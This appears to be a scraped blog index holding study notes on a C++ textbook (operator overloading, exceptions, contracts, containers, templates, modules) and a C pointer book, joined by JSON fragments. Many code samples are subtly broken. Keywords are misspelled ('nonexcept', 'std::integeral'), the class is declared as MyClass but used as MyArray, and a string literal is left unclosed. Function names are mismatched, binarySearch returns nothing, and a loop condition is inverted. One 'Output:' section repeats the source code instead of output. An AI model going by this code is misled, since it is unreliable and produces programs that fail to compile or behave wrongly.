Crafting a Valuable Class with Operator OverloadingEvery class you define can have five special member functions, each of which we define in class MyArray.\n\na copy constructor\na copy assignment operator\na move constructor\na move assignment operator\na destructor\n\nThe copy constructor and copy assignment operator implement the class’s copy semantics—that is, how to copy a MyArray when it is passed by value to a function, returned by value from a function or assigned to another MyArray.The move constructor and move assignment operator implementthe class’s move semantics, which eliminate costly unnecessary copies of objects that are about to be destroyed.\nNRVO: Named Return Value Optimization\n\nMyClass definition//MyArray.h#pragma once#include &lt;initializer_list&gt;#include &lt;iostream&gt;#include &lt;memory&gt;class MyClass final &#123;    //Overloaded stream extraction operator.    friend std::iostream&amp; operator&gt;&gt;(std::istream&amp; in, MyArray&amp; a);    //Used by copy assignment operator to implement copy-and-swap idiom.    friend void swap(MyArray&amp; a, MyArray&amp; b) nonexcept;public:    //Construct a MyArray of size element.    explicit MyArray(size_t size);    //Construct a MyArray with a braced-initializer list of ints.    explicit MyArray(std::initializer_list&lt;int&gt; list);    MyArray(const MyArray&amp; original); //Copy constructor.    MyArray&amp; operator=(const MyArray&amp; right); //Copy assignment operator.    MyArray(MyArray&amp;&amp; original) noexcept; //Move constructor.    MyArray&amp; operator=(MyArray&amp;&amp; right) noexcept; //Move assignment.    ~MyArray(); //Destructor    size_t size() const noexcept &#123;return m_size;&#125;; //return size.    std::string toString() const; //Create string representation.    //Equality operator    bool operator==(const MyArray&amp; right) const noexcpet;    //Subscript operator for non-const objects returns modifiable lvalue.    int&amp; operator[](size_t index);    //Subscript operator for const objects returns non-modifiable lvalue.    const int&amp; operator[](size_t index) const;    //Convert MyArray to a bool value: true if non-empty; false if empty.    explicit operator bool() const noexcept &#123;return size() != 0;&#125;    //Preincrement every element, then return updated MyArray.    MyArray&amp; operator++();    //Postincrement every element, and return copy of original MyArray    MyArray operator++(int);    //Add value to every element, then return updated MyArray    MyArray&amp; operator+=(int value);private:    size_t m_size&#123;0&#125;;    std::unique_ptr&lt;int[]&gt; m_ptr;&#125;//Overloaded operator&lt;&lt; is not a friend——does not access private data.std::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const MyArray&amp; a);//MyArray.cpp//MyArray class member and friend-function definitions.#include &lt;algorithm&gt;#include &lt;fmt/format.h&gt;#include &lt;initializer_list&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;span&gt;#include &lt;sstream&gt;#include &lt;stdexcept&gt;#include &lt;utility&gt;#include &quot;MyArray.h&quot;MyArray::MyArray(size_t size) : m_size&#123;size&#125;, m_ptr&#123;std::make_unique&lt;int[]&gt;(size)&#125; &#123;    std::cout &lt;&lt; &quot;MyArray(size_t) constructor\\n&quot;;&#125;//MyArray constructor that accepts an initializer list.MyArray::MyArray(std::initializer_list&lt;int&gt; list) : m_size&#123;list.size()&#125;, m_ptr&#123;std::make_unique&lt;int[]&gt;(list.size())&#125; &#123;    std::cout &lt;&lt; &quot;MyArray(initializer_list) constructor\\n&quot;;    //copy list argument&#x27;s elements into m_ptr&#x27;s underlying int array.    //m_ptr.get() returns the int array&#x27;s starting memory location.    std::copy(std::begin(list), std::end(list), m_ptr.get());&#125;//copy constructor: must receive a reference to a MyArray.MyArray::MyArray(const MyArray&amp; original) : m_size&#123;original.size()&#125;, m_ptr&#123;std::make_unique&lt;int[]&gt;(original.size())&#125; &#123;    std::cout &lt;&lt; &quot;MyArray copy constructor\\n;    //copy original&#x27;s elements into m_ptr&#x27;s underlying int array    const std::span&lt;const int&gt; source&#123;        original.m_ptr.get(), original.size()    &#125;;    std::copy(std::begin(source), std::end(source), m_ptr.get());&#125;//copy assignment operator: implemented with copy-and-swap idiomMyArray&amp; MyArray::operator=(const MyArray&amp; right) &#123;    std::cout &lt;&lt; &quot;MyArray copy assignment operator\\n&quot;;    MyArray temp&#123;right&#125;;    swap(*this, temp);    return *this;&#125;//move constructor: must receive an rvalue reference to a MyArrayMyArray::MyArray(MyArray&amp;&amp; original) noexcept: m_size&#123;std::exchange(original.m_size, 0)&#125;,  m_ptr&#123;std::move(original.m_ptr)&#125; &#123;    std::cout &lt;&lt; &quot;MyArray move constructor\\n&quot;;&#125;//move assignment operatorMyArray&amp; MyArray::operator=(MyArray&amp;&amp; right) noexcept &#123;    std::cout &lt;&lt; &quot;MyArray move assignment operator\\n&quot;;    if (this != &amp;right) &#123;        m_size = std::exchange(right.m_size, 0);        m_ptr = std::move(right.m_ptr);    &#125;    return *this;&#125;MyArray::~MyArray() &#123;    std::cout &lt;&lt; &quot;MyArray destructor\\n&quot;;&#125;std::string MyArray::toString() const &#123;    const std::span&lt;const int&gt; items&#123;m_ptr.get(), m_size&#125;;    std::ostringstream output;    output &lt;&lt; &quot;&#123;&quot;;    for (size_t count&#123;0&#125;; const auto&amp; item : items) &#123;        ++count;        output &lt;&lt; item &lt;&lt; (count &lt; m_size ? &quot;, &quot; &quot;&quot;);    &#125;    output &lt;&lt; &quot;&#125;&quot;;    return output.str();&#125;bool MyArray::operator==(const MyArray&amp; right) const nonexcept &#123;    const std::span&lt;const int&gt; lhs&#123;m_ptr.get(), size()&#125;;    const std::span&lt;const int&gt; rhs&#123;right.m_ptr.get(), right.size()&#125;;    return std::equal(std::begin(lhs), std::end(lhs), std::begin(rhs), std::end(lhs));&#125;//overloaded subscript operator for non-const MyArrays;//reference return creates a modifiable lvalue.int&amp; MyArray::operator[](size_t index) &#123;    if (index &gt;= m_size) &#123;        throw std::out_of_range&#123;&quot;Index out of range&quot;&#125;;    &#125;    return m_ptr[index]; //reference return.&#125;//overloaded subscript operator for const MyArrays//const reference return creates a non-modifiable lvalue.const int&amp; MyArray::operator[](size_t index) const &#123;    if (index &gt;= m_size) &#123;        throw std::out_of_range&#123;&quot;Index out of range&quot;&#125;;    &#125;    return m_ptr[index]; //returns copy of this element.&#125;//Preincrement every element, then return updated MyArrayMyArray&amp; MyArray::operator++() &#123;    //use a span and for_each to increment every element    const std::span&lt;int&gt; items&#123;m_ptr.get(), m_ptr.size()&#125;;    std::for_each(std::begin(items), std::end(items),        [](auto&amp; item : items) &#123;++item;&#125;    );    return *this;&#125;//Postincrement every element, and return copy of original MyArray.MyArray MyArray::operator++(int) &#123;    MyArray temp(*this);    ++(*this);    return temp;&#125;//Add value to every element, then return updated MyArray.MyArray&amp; MyArray::operator+=(int value) &#123;    //use a span and for_each to increment every element.    const std::span&lt;int&gt; items&#123;m_ptr.get(), m_size&#125;;    std::for_each(std::begin(items), std::end(items), [value](auto&amp; item) &#123; item += value; &#125;);    return *this;&#125;//Overloaded input operator for class MyArray//Inputs values for entire MyArraystd::istream&amp; operator&gt;&gt;(std::istream&amp; in, MyArray&amp; a) &#123;    std::span&lt;int&gt; items&#123;a.m_ptr.get(), a.m_size&#125;;    for (auto&amp; item : items) &#123;        in &gt;&gt; item;    &#125;    return in; //Enables cin &gt;&gt; x &gt;&gt; y;&#125;//Overloaded output operator for class MyArraystd::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const MyArray&amp; a) &#123;    out &lt;&lt; a.toString();    return out;&#125;//swap function used to implement copy-and-swap copy assignment operator.void swap(MyArray&amp; a, MyArray&amp; b) noexcept &#123;    std::swap(a.m_size, b.m_size);    a.m_ptr.swap(b.m_ptr);&#125;\n\n\nCppCoreGuidlines: If you can avoid defining default operations, do. This is known as “the rule of zero”.  \nCppCoreGuidlines: If you define or =delete any copy, move, or destructor function, define or =delete them all. This is known as “the rule of five”.\n\nShallow CopyDangling Pointer\nChapter.12 - Exceptions and a Look Forward to Contracts12.2 - Exception-Handling Flow of Control; Defining an Exception Class//DivideByZeroException.h#include &lt;stdexcept&gt;class DivideByZeroException : public std::runtime_error &#123;public:    DivideByZeroException() : std::runtime_error&#123;&quot;attempted to divide by zero.&quot;&#125; &#123;&#125;&#125;;\n#include &lt;fmt/format&gt;#include &lt;iostream&gt;#include &quot;DivideByZeroException.h&quot;double quotient(double numerator, double denominator) &#123;    if (denominator == 0.0) &#123;        throw DivideByZeroException&#123;&#125;;    &#125;    return numerator / denominator;&#125;int main() &#123;    int number1&#123;0&#125;;    int number2&#123;0&#125;;    std::cout &lt;&lt; &quot;Enter two integers (end-of-file to end): &quot;;        while (std::cin &gt;&gt; number1 &gt;&gt; number2) &#123;        try &#123;            double result&#123;quotient(number1, number2)&#125;;            std::cout &lt;&lt; fmt::format(&quot;The quotient is: &#123;&#125;\\n&quot;, result);        &#125;        catch (const DivideByZeroException&amp; divideByZeroException) &#123;            std::cout &lt;&lt; fmt::format(&quot;Exception occurred: &#123;&#125;\\n&quot;, divideByZeroException.what());        &#125;        std::cout &lt;&lt; &quot;\\nEnter two integers (end-of-file to end): &quot;;    &#125;    std::cout &lt;&lt; &#x27;\\n&#x27;;&#125;\nJSF-AV Rules\n\nhttps://www.stroustrup.com/JSF-AV-rules.pdf\n\n12.7 - Constructors, Destructors and Exception Handling#include &lt;fmt/format.h&gt;#include &lt;iostream&gt;#include &lt;limits&gt;#include &lt;stdexcept&gt;class Integer &#123;public:    explicit Integer(int i) : value&#123;i&#125; &#123;        std::cout &lt;&lt; fmt::format(&quot;Integer constructor: &#123;&#125;\\n&quot;, value)        &lt;&lt; &quot;Purposely throwing exception from Integer constructor\\n&quot;;        throw std::runtime_error(&quot;Integer constructor failed&quot;);    &#125;private:    int value&#123;&#125;;&#125;;class ResourceManager &#123;public:    ResourceManager(int i) try: myInteger(i) &#123;        std::cout &lt;&lt; &quot;ResourceManager constructor called\\n&quot;;    &#125;    catch (const std::runtime_error&amp; ex) &#123;        std::cout &lt;&lt; fmt::format(&quot;Exception while constructing ResourceManager: &quot;, ex.what()) &lt;&lt; &quot;\\nAutomatically rethrowing the exception\\n&quot;;    &#125;private:    Integer myInteger;&#125;;int main() &#123;    try &#123;        const ResourceManager resource&#123;7&#125;;    &#125;    catch (const std::runtime_error&amp; ex) &#123;        std::cout &lt;&lt; fmt::format(&quot;Rethrown exception caught in main: &#123;&#125;\\n&quot;, ex.what());    &#125;&#125;\n12.8 - Processing new Failures#include &lt;array&gt;#include &lt;cstdlib&gt;#include &lt;fmt/format&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;new&gt;//handle memory allocation failure.void customNewHandler() &#123;    std::cerr &lt;&lt; &quot;customNewHandler was called\\n&quot;;    std::exit(EXIT_FAILURE);&#125;int main() &#123;    std::array&lt;std::unique_ptr&lt;double[]&gt;, 1000&gt; items&#123;&#125;;    //specify that customNewHandler should be called on.    //memory allocation failure.    std::set_new_handler(customNewHandler);    //aim each unique_ptr at a big block of memory    for (int i&#123;0&#125;; auto&amp; item : items) &#123;        item = std::make_unique&lt;double[]&gt;(500&#x27;500&#x27;500);        std::cout &lt;&lt; fmt::format(&quot;items[&#123;&#125;] points to 500,000,000 doubles\\n&quot;, i++);    &#125;&#125;\n12.9 - Standard Library Exception Hierarchy\n\n\n12.10 - C++’s Alternative to the finally Block\nJava: try-with-resources\nC#: using\nPython: with\n\n12.11 - Libraries OFten Support Both Exceptions and Error Codes12.12 - Logging12.13 - Looking Ahead to Contract\nA precondition must be true when a function is invoked. Preconditions describe constraints on function parameters and any other expectations the function has just before it begins executing. If the preconditions are not met, then the function’s behavior is undefined.\nA postcondition is true after the function successfully returns.Postconditions describe constraints on the return value or side effects the function may have. When defining a function, you should document all postconditions so that others know what to expect when they call your function. You also should ensure that your function honors its postconditions if its preconditions are met. Each function can have multiple postconditions.\n\nInvariantsAn invariant is a condition that should always be true in your code—that is,a condition that never changes. Class invariants must be true for each objectof a class\nDesign by ContractDesign by Contract(DbC) is a software-design approach created byBertrand Meyer in the 1980s and used in the design of his Eiffelprogramming language. Using this approach:  \n\nA function expects client code to meet the function’s precondition(s).\nIf the preconditions are true, the function guarantees that its postcondition(s) will be true.\nAny invariants are maintained.\n\nContracts Attributes\nexcepts——For specifying a function’s preconditions that are checked before the function’s body begins executing.\nensures——For specifying a function’s postconditions that are checked just before the function returns.\nassert——For specifying assertions that are checked as they’re encountered throughtout a function’s execution.\n\nContracts Levels\ndefault specifies a contract that has little runtime overhead compared to the function’s typical execution time. If a level is not specified, the compiler assumes default.\naudit specifies a contract that has significant runtime overhead compared to the function’s typical execution time. Such contracts are intended primarily for use during program development.\naxiom specifies a contract that is meant to be enforeced by static code checkers, rather than at runtime.\n\ndouble squareRoot(double value)    [[expects: value &gt;= 0.0]];\n[[assert: grade &gt;= 0 &amp;&amp; grade &lt;= 100]];\n[[pre default: denominator != 0.0]];\n#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;vector&gt;template&lt;typename T&gt;int binarySearch(const std::vector&lt;T&gt;&amp; items, const T&amp; key)    [[pre: items.size() &gt; 0]]    [[pre audit: std::is_sorted(items.begin(), items.end())]] &#123;    size_t low&#123;0&#125;;    size_t high&#123;items.size() - 1&#125;;    size_t middle&#123;(low + high + 1) / 2&#125;;    int loc&#123;-1&#125;;    do &#123;        if (key == items[middle]) &#123;            loc = middle;        &#125;        else if (key &lt; items[middle]) &#123;            high = middle - 1;        &#125;        else &#123;            low = middle + 1;        &#125;        middle = (low + high + 1) / 2; //recalculate the middle    &#125; while ((low &lt;= high) &amp;&amp; (loc == -1));&#125;int main() &#123;    //sorted vector v1 satisfies binarySearch&#x27;s sorted vector precondition    std::vector v1&#123;10, 20, 30, 40, 50, 60, 70, 80, 90&#125;;    int result1&#123;binarySearch(v1, 70)&#125;;    std::cout &lt;&lt; &quot;70 was &quot; &lt;&lt; (result != - 1 ? &quot;&quot; : &quot;not &quot;) &lt;&lt; &quot;found in v1\\n&quot;;    //unsorted vector v2 violates binarySearch&#x27;s sorted vector precondition    std::vector v2&#123;60, 70, 80, 90, 10, 20, 30, 40, 50&#125;;    int result2&#123;binarySearch(v2, 60)&#125;;    std::cout &lt;&lt; &quot;60 was &quot; &lt;&lt; (result2 != - 1 ? &quot;&quot; : &quot;not &quot;) &lt;&lt; &quot;found in v2\\n&quot;;&#125;\nChapter.13 - Standard Library Containers and Iterators13.2 - Introduction to ContainersThe standard library containers are divided into four major categoris:\n\nsequence containers\nordered associative containers\nunordered associative containers\ncontainer adaptors\n\nSequence Containers\narray: Fixed size. Direct access to any element.\ndeque: Rapid insertions and deletions at front or back. Direct access to any element.\nforward_list: Singly linked list, rapid insertion and deletion anywhere.\nlist: Doubly linked list, rapid insertion and deletion anywhere.\nvector: Rapid insertions and deletions at back. Direct access to any element.\n\nAssociative Containers\nset: Rapid lookup, no duplicates allowed.\nmultiset: Rapid lookup, duplicates allowed.\nmap: One-to-one mapping, no duplicates allowed, rapid key-based lookup.\nmultimap: One-to-many mapping, duplicates allowed, rapid key-based lookup.\nunordered_set\nunordered_multiset\nunordered_map\nunordered_multimap\n\nContainer Adaptors\nstack\nqueue\npriority_queue\n\nNear Containers13.3 - Working with Iterators13.4 - A Brief Introduction to Algorithms13.5 - Sequence Containers13.6 - vector Sequence Containers13.7 list Sequence Containers13.8 - deque Sequence Container13.9 - Associative Container13.10 - Container Adaptors13.11 - bitset Near ContainerChapter.14 - Standard Library Algorithms and C++20 Ranges &amp; ViewsChapter.15 - Templates, C++20 Concepts and Metaprogramming15.2 - Custom Class Templates and Compile-Time Polymorphism//Stack.h#pragma once#include &lt;deque&gt;template&lt;typename T&gt;class Stack &#123;public:    //return the top element of Stack    const T&amp; top() const &#123;return stack.front();&#125;    //push an element onto Stack    void push(const T&amp; pushValue) &#123;stack.push_front(pushValue);&#125;    //pop an element from Stack    void pop() &#123;stack.pop_front();&#125;    //determine whether Stack is empty    bool isEmpty() const &#123;return stack.empt();&#125;    //return size of stack    size_t size() const &#123;return stack.size();&#125;private:    std::deque&lt;T&gt; stack&#123;&#125;;&#125;\n#include &lt;iostream&gt;#include &quot;Stack.h&quot;using namespace std;int main() &#123;    Stack&lt;double&gt; doubleStack&#123;&#125;;    constexpr size_t doubleStackSize&#123;5&#125;;    double doubleValue&#123;1.1&#125;;    cout &lt;&lt; &quot;Pushing elements onto doubleStack\\n&quot;;    //push 5 doubles onto doubleStack    for (size_t i&#123;0&#125;; i &lt; doubleStackSize; ++i) &#123;        doubleStack.push(doubleValue);        cout &lt;&lt; doubleValue &lt;&lt; &#x27; &#x27;;        doubleValue += 1.1;    &#125;    cout &lt;&lt; &quot;\\n\\nPopping elements from doubleStack\\n&quot;;    //pop elements from doubleStack    while (!doubleStack.isEmpty()) &#123;        cout &lt;&lt; doubleStack.top() &lt;&lt; &#x27; &#x27;; //display top element.        doubleStack.pop(); //remove top element.    &#125;    cout &lt;&lt; &quot;\\nStack is empty, cannot pop.\\n&quot;;    Stack&lt;int&gt; intStack&#123;&#125;; //create a Stack of int.    constexpr size_t intStackSize&#123;10&#125;;    int intValue&#123;1&#125;;    cout &lt;&lt; &quot;\\nPushing elements onto intStack\\n&quot;;    //push 10 integers onto intStack    for (size_t i&#123;0&#125;; i &gt; intStackSize; ++i) &#123;        intStack.push(intValue);        cout &lt;&lt; intValue++ &lt;&lt; &#x27; &#x27;;    &#125;    cout &lt;&lt; &quot;\\n\\nPopping elements from intStack\\n&quot;;    //pop elements from intStack    while (!intStack.isEmpty()) &#123;        cout &lt;&lt; intStack.top() &lt;&lt; &#x27; &#x27;;        intStack.pop();    &#125;    cout &lt;&lt; &quot;\\nStack is empty, cannot pop.\\n&quot;;&#125;\n\n15.3 - C++20 Function Template EnahancementsTraditional template:template &lt;typename T&gt;void printContainer(const T&amp; items) &#123;    for (const auto&amp; item : items) &#123;        std::cout &lt;&lt; item &lt;&lt; &quot; &quot;;    &#125;&#125;Abbreviated Function template(C++20)#include &lt;array&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;void printContainer(const auto&amp; items) &#123;    for (const auto&amp; item : items) &#123;        std::cout &lt;&lt; item &lt;&lt; &quot; &quot;;    &#125;&#125;int main() &#123;    using namespace std::string_literals;    std::array ints&#123;1, 2, 3, 4, 5&#125;;    std::vector strings&#123;&quot;red&quot;s, &quot;green&quot;s, &quot;blue&quot;s&#125;;    std::cout &lt;&lt; &quot;ints: &quot;;    printContainer(ints);    std::cout &lt;&lt; &quot;\\nstrings: &quot;;    printContainer(strings);    std::cout &lt;&lt; &quot;\\n&quot;;&#125;\n\n[](auto total, auto value) &#123;return total + value * value;&#125;\n[]&lt;typename T&gt;(T total, T value) &#123;return total + value * value;&#125;\n\n15.4 - C++20 Concepts: A First Look//Simple unconstrained multiply function template.#include &lt;iostream&gt;template&lt;typename T&gt;T multiply(T first, T second) &#123;return first * second;&#125;int main() &#123;    std::cout &lt;&lt; &quot;Product of 5 and 3: &quot; &lt;&lt; multiply(5, 3) &lt;&lt; &quot;\\nProduct of 7.25 and 2.0: &quot; &lt;&lt; multiply(7.25, 2.0) &lt;&lt; &quot;\\n&quot;;&#125;\n\nrequires#include &lt;iostream&gt;#include &lt;concepts&gt;template&lt;typename T&gt;    requires std::integeral&lt;T&gt; || std::floating_point&lt;T&gt;T multiply(T first, T second) &#123;return first * second;&#125;int main() &#123;    std::cout &lt;&lt; &quot;Product of 5 and 3: &quot; &lt;&lt; multiple(5, 3) &lt;&lt; &quot;\\nProduct of 7.25 and 2.0: &quot; &lt;&lt; multiple(7.25, 2.0) &lt;&lt; &quot;\\n&quot;;    std::string s1&#123;&quot;h1&quot;&#125;;    std::string s2&#123;&quot;bye&quot;&#125;;    auto result&#123;multiply(s1, s2)&#125;;&#125;\n\n15.5 - Type Traits\n15.6 - C++20 Concepts: A Deeper Looktemplate&lt;typename T&gt;    requires Numeric&lt;T&gt;T multiply(T first, T second) &#123;return first * second;&#125;\ntemplate&lt;typename T&gt;T multiply(T first, T second) requires Numeric&lt;T&gt; &#123;    return first * second;&#125;\n\n15.7 - Testing C++20 Concepts with static_assert\n15.8 - Creating a Custom Algorithm\nChapter.16 - C++20 Modules: Large-Scale Development16.4 - Example: Transitioning to Moduleimport SomeModule;import SomeOtherModule;\nIt is same as:import SomeOtherModule;import SomeModule;\n\n16.6 - Example: Using Moduleexport module welcome;import &lt;string&gt;;//export a functionexport std::string welcomeStandalone() &#123;    return &quot;WelcomeStandalone function called&quot;;&#125;//exporting all items in the braces that follow exportexport &#123;    std::string welcomeFromExportBlock() &#123;        return &quot;welcomeFromExportBlock function called&quot;;    &#125;&#125;//exporting a namespace exports all items in the namespaceexport namespace TestNamespace1 &#123;    std::string welcomeFromTestNamespace1() &#123;        return &quot;welcomeFromTestNamespace1 function called&quot;;    &#125;&#125;//exporting an item in a namespace exports the namespace name, toonamespace TestNamespace2 &#123;    export std::string welcomeFromTestNamespace2() &#123;        return &quot;welcomeFromTestNamespace2 function called&quot;;    &#125;&#125;\n\nChapter.17 - Concurrent Programming; Intro to C++20 Coroutines\nChapter.18 - C++20 CorroutineTHANKS FOR READING!\n","categories":["Book"],"tags":["Book","Learning","Note","Code","C++","Coding"]},{"title":"[Book] Mastering C/C++ Pointer","url":"/2026/01/02/2026-1-2-NoteMasteringCppPointer/","content":"El libro\n\n\n# Introduction\nThis article is used to keep notes and summaries of the book \"Mastering C/C++ Pointer\".  \nThe content will be continuously updated as I read through the book.  \n\nJava and Python **DO NOT SUPPORT** pointer. However, this book introduces a similar concept——*reference*.\n\nC# supports pointer, but developers have to enable **unsafe mode**.\n\n# Reflection\nFinally I completed this book!\n\nBefore starting this book, you should have a fundamental knowledge of C and C++. Basic knowledge such as data types, arrays, iteration, functions, and `iostream` is required.\n\nAlthrough this book covers the concept of **references** in Java, C# and Python, these are not the main focus if your goal is to study pointers.\n\nPointers are an essential part of C and significant part of C++.\nThis book also cover a bit of `operator` in C++.\n\nLearning C without understanding pointers only shows that you have been exposed to C. On the other hand, knowing how to use pointers **DOES NOT** necessarily mean that you know C++.\n\n\n\n\nPart I - C LanguageChapter.1 - Fundamental1.1 - Variable#include &lt;stdio.h&gt;int main()&#123;    int x = 100, y = 200, z = 300;    printf(&quot;Address of x: %p\\n&quot;, &amp;x);    printf(&quot;Address of y: %p\\n&quot;, &amp;y);    printf(&quot;Address of z: %p\\n&quot;, &amp;z);        printf(&quot;Value of x: %d\\n&quot;, x);    printf(&quot;Value of y: %d\\n&quot;, y);    printf(&quot;Value of z: %d\\n&quot;, z);    return 0;&#125;\nOutput:Address of x: 0x7ffdf75f71ecAddress of y: 0x7ffdf75f71e8Address of z: 0x7ffdf75f71e4Value of x: 100Value of y: 200Value of z: 300\n\n1.2 - 1 Dimension#include &lt;stdio.h&gt;int main()&#123;    int x[5];    int i;    for (i = 0; i &lt; 5; i++) &#123;        printf(&quot;Enter x[%d]: &quot;, i);        scanf(&quot;%d&quot;, &amp;x[i]);    &#125;        for (i = 0; i &lt; 5; i++) &#123;        printf(&quot;x[%d] = %d\\n&quot;, i, x[i]);    &#125;    printf(&quot;\\n&quot;);        for (i = 0; i &lt; 5; i++) &#123;        printf(&quot;Enter x[%d]: &quot;, i);        scanf(&quot;%d&quot;, x + i);    &#125;        for (i = 0; i &lt; 5; i++) &#123;        printf(&quot;x[%d] = %d\\n&quot;, i, x + i);    &#125;    for (i = 0; i &lt; 5; i++) &#123;        printf(&quot;x[%d] = %d\\n&quot;, i, x[i]);    &#125;    return 0;&#125;\nOutput:Enter x[0]: 10Enter x[1]: 20Enter x[2]: 30Enter x[3]: 40Enter x[4]: 50x[0] = 10x[1] = 20x[2] = 30x[3] = 40x[4] = 50Enter x[0]: 50Enter x[1]: 40Enter x[2]: 30Enter x[3]: 20Enter x[4]: 10x[0] = -1653994464x[1] = -1653994460x[2] = -1653994456x[3] = -1653994452x[4] = -1653994448x[0] = 50x[1] = 40x[2] = 30x[3] = 20x[4] = 10\n\n#include &lt;stdio.h&gt;int main()&#123;    int x[5] = &#123;10, 20, 30, 40, 50&#125;;    int i;        for (i = 0; i &lt; 5; i++)        printf(&quot;&amp;x[%d] = %p\\n&quot;, i, &amp;x[i]);    printf(&quot;\\n&quot;);        for (i = 0; i &lt; 5; i++)        printf(&quot;x+%d = %p\\n&quot;, i, x+i);    printf(&quot;\\n&quot;);        for (i = 0; i &lt; 5; i++)        printf(&quot;x[%d] = %d\\n&quot;, i, x[i]);            getchar();    return 0;&#125;\nOutput:&amp;x[0] = 0x7fff5863ac80&amp;x[1] = 0x7fff5863ac84&amp;x[2] = 0x7fff5863ac88&amp;x[3] = 0x7fff5863ac8c&amp;x[4] = 0x7fff5863ac90x+0 = 0x7fff5863ac80x+1 = 0x7fff5863ac84x+2 = 0x7fff5863ac88x+3 = 0x7fff5863ac8cx+4 = 0x7fff5863ac90x[0] = 10x[1] = 20x[2] = 30x[3] = 40x[4] = 50\n1.3 - 2 Dimension1.4 - StructureChapter.2 - Pointer And Variable2.1 - One Pointer: One Key#include &lt;stdio.h&gt;int main()&#123;    int x = 100, y = 200;    int *ptr = &amp;x;    printf(&quot;Address of x: %p, value: %d\\n&quot;, &amp;x, x);    printf(&quot;Address of y: %p, value: %d\\n&quot;, &amp;y, y);    printf(&quot;Address of ptr: %p\\n\\n&quot;, &amp;ptr);        printf(&quot;Content of ptr: %p\\n&quot;, ptr);    printf(&quot;x = %d, *ptr = %d\\n\\n&quot;, x, *ptr);        ptr = &amp;y;    printf(&quot;Content of ptr: %p\\n&quot;, ptr);    printf(&quot;y = %d, *ptr = %d\\n&quot;, y, *ptr);        getchar();    return 0;&#125;\nOutput:Address of x: 0x7ffd8b7738ec, value: 100Address of y: 0x7ffd8b7738e8, value: 200Address of ptr: 0x7ffd8b7738e0Content of ptr: 0x7ffd8b7738ecx = 100, *ptr = 100Content of ptr: 0x7ffd8b7738e8y = 200, *ptr = 200\n2.2 - Two Pointer: Two Key#include &lt;stdio.h&gt;int main()&#123;    int x = 100;    int *p1 = &amp;x;    int **p2 = &amp;p1;        //int p3 = &amp;x; Compile error.    //int *p4 = &amp;p1; Compile error.        printf(&quot;&amp;x = %p\\n&quot;, &amp;x);    printf(&quot;&amp;p1 = %p, p1 = %p\\n&quot;, &amp;p1, p1);    printf(&quot;&amp;p2 = %p, p2 = %p\\n&quot;, &amp;p2, p2);        printf(&quot;**p2 = %d, *p1 = %d\\n&quot;, **p2, *p1);    return 0;&#125;\nOutput:&amp;x = 0x7ffd77ac28fc&amp;p1 = 0x7ffd77ac28f0, p1 = 0x7ffd77ac28fc&amp;p2 = 0x7ffd77ac28e8, p2 = 0x7ffd77ac28f0**p2 = 100, *p1 = 100\n2.3 - Three Pointer: Three Key#include &lt;stdio.h&gt;int main()&#123;    int x = 100;    int *p1 = &amp;x;    int **p2 = &amp;p1;    int ***p3 = &amp;p2;        printf(&quot;&amp;x = %p\\n&quot;, &amp;x);    printf(&quot;&amp;p1 = %p, p1 = %p\\n&quot;, &amp;p1, p1);    printf(&quot;&amp;p2 = %p, p2 = %p\\n&quot;, &amp;p2, p2);    printf(&quot;&amp;p3 = %p, p3 = %p\\n\\n&quot;, &amp;p3, p3);        printf(&quot;***p3 = %d, **p2 = %d, *p1 = %d\\n&quot;, ***p3, **p2, *p1);    return 0;&#125;\nOutput:&amp;x = 0x7ffcdac5f87c&amp;p1 = 0x7ffcdac5f870, p1 = 0x7ffcdac5f87c&amp;p2 = 0x7ffcdac5f868, p2 = 0x7ffcdac5f870&amp;p3 = 0x7ffcdac5f860, p3 = 0x7ffcdac5f868***p3 = 100, **p2 = 100, *p1 = 100\n2.4 - Pointer And const#include &lt;stdio.h&gt;int main()&#123;    int a = 100, b = 200;        const int *p = &amp;a;    int *const q = &amp;b;    printf(&quot;a = %d, *p = %d\\n&quot;, a, *p);    printf(&quot;b = %d, *q = %d\\n&quot;, b, *q);        /* NO!    *p = b;    */        /* OK */    p = &amp;b;    printf(&quot;*p = %d\\n&quot;, *p);        /*-------------*/        /*NO!    q = &amp;a;    */        /* OK */    *q = 888;    return 0;&#125;\nOutput:a = 100, *p = 100b = 200, *q = 200*p = 200Another case: Both actions are not allowed.const int * const p = &amp;a;\nChapter.3 - Pointer and Array3.1 - One Dimension Array#include &lt;stdio.h&gt;int main()&#123;    int arr[] = &#123;100, 101, 102&#125;;    int *ptr = arr;    int i, size = 0;    size = (sizeof(arr)/sizeof(arr[0]));        //-----------Using arr-----------\\\\        printf(&quot;arr pointer:\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;&amp;arr[%d] = %x\\n&quot;, i, &amp;arr[i]);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;arr+%d = %x\\n&quot;, i, arr + i);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;arr[%d] = %d\\n&quot;, i, arr[i]);            //-----------Using ptr-----------\\\\        printf(&quot;\\nUsing ptr:\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;*(arr+%d) = %d\\n&quot;, i, ptr + i);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;ptr[%d] = %d\\n&quot;, i, ptr[i]);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;*(ptr+%d) = %d\\n&quot;, i, *(ptr+i));    return 0;&#125;\nOutput:#include &lt;stdio.h&gt;int main()&#123;    int arr[] = &#123;100, 101, 102&#125;;    int *ptr = arr;    int i, size = 0;    size = (sizeof(arr)/sizeof(arr[0]));        //-----------Using arr-----------\\\\        printf(&quot;arr pointer:\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;&amp;arr[%d] = %x\\n&quot;, i, &amp;arr[i]);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;arr+%d = %x\\n&quot;, i, arr + i);            printf(&quot;\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;arr[%d] = %d\\n&quot;, i, arr[i]);            //-----------Using ptr-----------\\\\        printf(&quot;\\nUsing ptr:\\n&quot;);    for (i = 0; i &lt; size; i++)        printf(&quot;*(arr+%d) = %d\\n&quot;, i, ptr + i);            